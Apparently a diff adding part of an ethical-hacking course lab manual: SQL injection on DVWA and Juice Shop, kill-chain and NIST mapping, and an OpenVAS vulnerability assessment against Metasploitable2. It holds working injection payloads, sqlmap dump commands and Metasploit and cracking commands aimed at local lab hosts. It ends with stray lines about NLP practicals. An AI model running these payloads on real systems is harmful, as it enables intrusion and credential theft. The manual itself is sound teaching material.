+Successfully created and read ADS on a Windows VM
+Detected hidden streams using 
+dir /r
+ and Sysinternals Streams
+Understood why ADS is dangerous and how to counter it
+P6 — SQL Injection
+Objective
+Perform SQL Injection on DVWA or Juice Shop to extract data and understand mitigation
+strategies.
+Prerequisites
+DVWA or Juice Shop running (see P1)
+SQLMap installed (pre-installed in Kali)
+Step 1: Manual SQL Injection on DVWA
+Login Bypass
+1. Navigate to DVWA → SQL Injection page.
+2. In the User ID field, try:
+1                         
+1'                        
+1' OR '1'='1             
+1' OR 1=1--              -- Normal query-- Syntax error (confirms injectable)-- Returns all users-- Comment-based bypass
+Extract Database Name
+1' UNION SELECT null, database()-- 
+Extract Table Names
+1' UNION SELECT null, table_name FROM information_schema.tables WHERE 
+table_schema=database()-- 
+Extract Column Names
+1' UNION SELECT null, column_name FROM information_schema.columns WHERE 
+table_name='users'-- 
+Extract User Data
+1' UNION SELECT user, password FROM users-- 
+Step 2: Automated SQL Injection with SQLMap
+Basic Scan
+# First, intercept the request URL from DVWA (copy from browser address 
+bar)
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?
+id=1&Submit=Submit" \--cookie="PHPSESSID=your_session_id; security=low" \--dbs
+To get your session cookie:
+Open browser → DevTools (F12) → Application → Cookies → Copy 
+Extract Tables
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?
+id=1&Submit=Submit" \--cookie="PHPSESSID=abc123; security=low" \-D dvwa --tables
+PHPSESSID
+ value
+Extract User Data
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?
+id=1&Submit=Submit" \--cookie="PHPSESSID=abc123; security=low" \-D dvwa -T users --dump
+SQLMap on Juice Shop
+# Intercept a login request URL and use SQLMap on it
+sqlmap -u "http://localhost:3000/rest/user/login" \--data='{"email":"*","password":"test"}' \--level=5 --risk=3
+Step 3: Blind SQL Injection (DVWA Medium Security)
+Set DVWA security to Medium, then:
+# Use SQLMap with POST method
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/" \--data="id=1&Submit=Submit" \--cookie="PHPSESSID=abc123; security=medium" \--technique=B --dbs
+Step 4: Mitigation Techniques
+Understanding how to prevent SQL injection:
+// VULNERABLE CODE
+$id = $_GET['id'];
+$query = "SELECT * FROM users WHERE id = '$id'";
+// SECURE CODE — Using Prepared Statements
+$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
+$stmt->execute([$id]);
+Key countermeasures:
+Use prepared statements / parameterized queries
+Input validation and whitelist filtering
+Least privilege database accounts
+Web Application Firewall (WAF)
+Expected Outcome
+Manually extracted user credentials from DVWA
+Automated extraction using SQLMap
+Documented mitigation techniques
+P7 — Framework Mapping (NIST / Cyber Kill Chain)
+Objective
+Map a given security incident to the NIST Cybersecurity Framework (CSF) and the Cyber Kill
+Chain, then prepare a simple report.
+Tools Required
+Text editor or LibreOffice Writer on Kali
+Browser for reference
+Step 1: Understand the Scenario
+Sample Incident: A company's web server was compromised. An attacker performed
+reconnaissance, found an open SSH port, brute-forced credentials, installed a backdoor,
+exfiltrated customer data, and deleted log files.
+Step 2: Map to the Cyber Kill Chain
+The Cyber Kill Chain has 7 stages:
+Stage Definition What Happened in Incident
+1. Reconnaissance Gathering info
+about the target
+Attacker scanned for open ports using Nmap;
+found SSH on port 22
+2. Weaponization Creating attack
+tools
+Prepared brute-force wordlist and script
+(Hydra/Medusa)
+3. Delivery Transmitting the
+weapon
+Launched SSH brute-force attack from external IP
+4. Exploitation Triggering the
+attack
+Gained access using brute-forced credentials admin:123456
+5. Installation Installing a
+backdoor
+Installed a reverse shell cron job for persistence
+6. Command &
+Control (C2)
+Maintaining
+control
+Connected to attacker's C2 server via encrypted
+channel
+7. Actions on
+Objectives
+Achieving the
+goal
+Exfiltrated 
+/var/www/html/db/customers.sql
+;
+deleted 
+/var/log/auth.log
+Step 3: Map to NIST Cybersecurity Framework (CSF)
+The NIST CSF has 5 core functions:
+Function Description Gaps Identified
+Identify Asset management, risk
+assessment
+No port-level asset inventory; SSH left open
+with weak credentials
+Protect Access controls, data security No MFA on SSH; no password policy enforced;
+no WAF
+Detect Monitoring, anomaly
+detection
+No brute-force detection alerts; no SIEM in
+place
+Respond Response planning,
+communications
+No incident response plan; delayed discovery
+Recover Recovery planning,
+improvements
+No backups of logs; no post-incident review
+process
+Step 4: Create the Report in Kali
+# Open a text editor
+nano incident_report.md
+Write the following structure:
+# Security Incident Report
+**Date:** [Today's Date]
+**Analyst:** [Your Name]
+**Incident:** Web Server Compromise via SSH Brute-Force
+## Executive Summary
+...
+## Cyber Kill Chain Analysis
+| Stage | Attacker Activity | Indicator of Compromise |
+...
+## NIST CSF Mapping
+| Function | Gap | Recommendation |
+...
+## Recommendations
+1. Enable MFA for SSH
+2. Deploy fail2ban for brute-force protection
+3. Implement centralized logging (SIEM)
+4. Regular vulnerability assessments
+Step 5: Practical Exercise — Map the P4 Exploit
+Based on what you did in P4 (Metasploit on Metasploitable2), map it:
+Reconnaissance  → nmap -sV 192.168.56.101
+Weaponization   → Metasploit module selected (vsftpd_234_backdoor)
+Delivery        
+→ exploit command sent over TCP port 21
+Exploitation    
+Installation    
+C2              
+Actions         
+→ Backdoor triggered; shell spawned
+→ (Could add a cron job for persistence)
+→ Meterpreter session established
+→ hashdump / data exfiltration
+Expected Outcome
+Completed Cyber Kill Chain mapping for a scenario
+Completed NIST CSF gap analysis
+Produced a structured incident report document
+P8 — Vulnerability Assessment Report
+Objective
+Perform a basic vulnerability assessment on a test VM using OpenVAS or Nessus and prepare
+a detailed report with findings and recommendations.
+Prerequisites
+Kali Linux
+Metasploitable2 (target VM) on Host-Only network
+OpenVAS (Greenbone Vulnerability Manager) — available in Kali
+Step 1: Install and Set Up OpenVAS (Greenbone)
+# Install OpenVAS
+sudo apt update
+sudo apt install -y openvas
+# Initialize OpenVAS (this downloads NVT feeds — takes 15–30 minutes)
+sudo gvm-setup
+# Start the services
+sudo gvm-start
+# Check if running
+sudo gvm-check-setup
+Step 2: Access the Greenbone Web Interface
+# Get the auto-generated admin password (shown during setup)
+# OR reset it
+sudo runuser -u _gvm -- gvmd --user=admin --new-password=admin123
+Open Firefox and navigate to:
+https://127.0.0.1:9392
+Login with 
+admin
+ / 
+admin123
+ (accept the self-signed certificate warning).
+Step 3: Configure a Scan Target
+1. Go to Configuration → Targets → New Target (star icon)
+2. Fill in:
+Name: 
+Metasploitable2
+Hosts: 
+192.168.56.101
+ (your Metasploitable2 IP)
+Alive Test: ICMP, TCP-ACK Service & ARP Ping
+3. Click Save.
+Step 4: Create and Launch a Scan Task
+1. Go to Scans → Tasks → New Task
+2. Fill in:
+Metasploitable2 Assessment
+Name: 
+Scan Config: 
+Full and fast
+Target: Select 
+Metasploitable2
+3. Click Save.
+4. Click the Play button (▶) to start the scan.
+5. Wait for the scan to complete (20‒60 minutes depending on settings).
+Step 5: View and Export Results
+1. Go to Scans → Results
+2. Click on the completed task.
+3. Review vulnerabilities sorted by Severity (Critical / High / Medium / Low).
+4. Click on individual vulnerabilities to see:
+Description
+CVSS Score
+Affected service/port
+Solution/Fix
+Export the report:
+1. Go to Scans → Reports
+2. Select the report → Click Download → Choose PDF or XML
+# Copy the exported report to your working directory
+cp ~/Downloads/report_*.pdf /home/kali/vulnerability_report.pdf
+Step 6: Alternative — Using Nmap Scripting Engine (NSE) for
+Quick Assessment
+If OpenVAS setup is too slow, use Nmap's built-in vulnerability scripts:
+# Run vulnerability scan using NSE scripts
+nmap -sV --script vuln 192.168.56.101 -oN vuln_scan.txt
+# Specific vulnerability checks
+nmap --script smb-vuln* 192.168.56.101
+nmap --script ftp-vsftpd-backdoor 192.168.56.101
+nmap --script http-sql-injection 192.168.56.101
+Step 7: Prepare the Vulnerability Assessment Report
+Create a formal report using the structure below:
+nano VA_Report.md
+Report Template
+# Vulnerability Assessment Report
+**Target System:** Metasploitable2 (192.168.56.101)
+**Assessment Date:** [Date]
+**Conducted By:** [Name]
+**Tools Used:** OpenVAS / Nmap NSE--
+## 1. Executive Summary
+A vulnerability assessment was conducted on the target system 
+Metasploitable2 (192.168.56.101). A total of X vulnerabilities were 
+identified: Y Critical, Z High, W Medium, V Low.--
+## 2. Scope and Methodology- **Scope:** Single host — 192.168.56.101- **Method:** Automated scanning (OpenVAS Full and Fast profile)- **Restrictions:** No denial-of-service testing performed--
+## 3. Findings Summary
+| # | Vulnerability | Severity | CVE | Port/Service |
+|---|--------------|----------|-----|-------------|
+| 1 | vsftpd 2.3.4 Backdoor | Critical | CVE-2011-2523 | 21/ftp |
+| 2 | UnrealIRCd Backdoor | Critical | CVE-2010-2075 | 6667/irc |
+| 3 | MySQL No Auth | High | — | 3306/mysql |
+| 4 | PHP CGI Argument Injection | High | CVE-2012-1823 | 80/http |
+| 5 | Weak SSH Credentials | Medium | — | 22/ssh |--
+## 4. Detailed Findings
+### 4.1 vsftpd 2.3.4 Backdoor (Critical)- **CVE:** CVE-2011-2523- **CVSS Score:** 10.0- **Port:** 21 (FTP)- **Description:** vsftpd version 2.3.4 contains a backdoor that 
+allows unauthenticated remote command execution.- **Evidence:** Exploit confirmed via Metasploit module.- **Recommendation:** Upgrade vsftpd to version 3.x or later 
+immediately.
+### 4.2 [Next Finding...]--
+## 5. Risk Matrix
+| Severity | Count | Risk Level |
+|----------|-------|-----------|
+| Critical | 2 | Immediate action required |
+| High | 3 | Resolve within 7 days |
+| Medium | 5 | Resolve within 30 days |
+| Low | 8 | Resolve in next maintenance window |--
+## 6. Recommendations
+1. Patch all critical vulnerabilities immediately.
+2. Disable unused services (IRC, FTP if not required).
+3. Enforce strong password policies for all services.
+4. Implement a firewall to restrict access to management ports.
+5. Enable logging and deploy a SIEM solution.
+6. Schedule quarterly vulnerability assessments.--
+## 7. Conclusion
+The target system is critically vulnerable and should not be 
+exposed to production networks. Immediate remediation is required.
+Step 8: Convert Report to PDF (Optional)
+# Install pandoc if needed
+sudo apt install pandoc texlive-xetex -y
+# Convert markdown report to PDF
+pandoc VA_Report.md -o VA_Report.pdf --pdf-engine=xelatex
+Expected Outcome
+Completed automated vulnerability scan using OpenVAS or Nmap NSE
+Identified and categorized multiple vulnerabilities with CVE references
+Produced a professional vulnerability assessment report with remediation
+recommendations
+Quick Reference: Common Kali Linux Commands
+# View IP configuration
+# Network
+ifconfig / ip addr           
+nmap -sV <target>            
+netstat -tulnp               
+# Web Testing
+sqlmap -u <url> --dbs        
+nikto -h <target>            
+dirb http://<target>         
+# Port and service scan
+# Active connections
+# SQL injection scan
+# Web server vulnerability scan
+# Directory brute-force
+# Password Tools
+john --wordlist=rockyou.txt hashes.txt
+hashcat -m 0 -a 0 hashes.txt rockyou.txt
+# Metasploit
+msfconsole                   
+search <term>                
+use <module>                 
+show options                 
+set RHOSTS <IP>              
+exploit / run                
+# Service Management
+sudo systemctl start apache2
+sudo systemctl start mariadb
+sudo gvm-start               
+# Start Metasploit
+# Search for modules
+# Load a module
+# Show required options
+# Set target
+# Launch the exploit
+# Start OpenVAS
+Document prepared for DSE/GE7e Ethical Hacking — Semester VI/VII
+All practicals must be conducted in isolated virtual environments only.
 print("All 10 NLP Practicals Completed Successfully.")
 print(SEP)
